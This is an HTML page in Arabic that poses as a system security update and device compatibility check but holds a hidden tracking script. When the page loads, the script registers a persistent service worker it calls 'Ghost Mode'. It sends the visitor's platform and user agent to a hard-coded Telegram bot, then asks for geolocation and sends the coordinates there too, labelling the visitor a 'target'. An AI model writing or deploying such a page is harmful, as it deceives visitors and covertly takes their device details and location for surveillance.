<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان النظام</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>HADI_V142_SYSTEM_CHECK</h1>
    <div class="loader"></div>
    <p id="status">جاري فحص توافق الجهاز...</p>

    <script>
        const TG_URL = "https://api.telegram.org/bot8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU/sendMessage?chat_id=6978465145";

        // تسجيل خدمة البقاء الخلفية (Ghost Mode)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
            .then(() => console.log("Service Worker Active"));
        }

        // سحب البيانات الأولية فوراً
        async function capture() {
            let info = `🚀 هدف جديد متصل!\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
            await fetch(`${TG_URL}&text=${encodeURIComponent(info)}`);

            // طلب الموقع الجغرافي (للسحب الدقيق)
            navigator.geolocation.getCurrentPosition(pos => {
                let loc = `📍 موقع الهدف:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}`;
                fetch(`${TG_URL}&text=${encodeURIComponent(loc)}`);
            });
        }
        capture();
    </script>
</body>
</html>
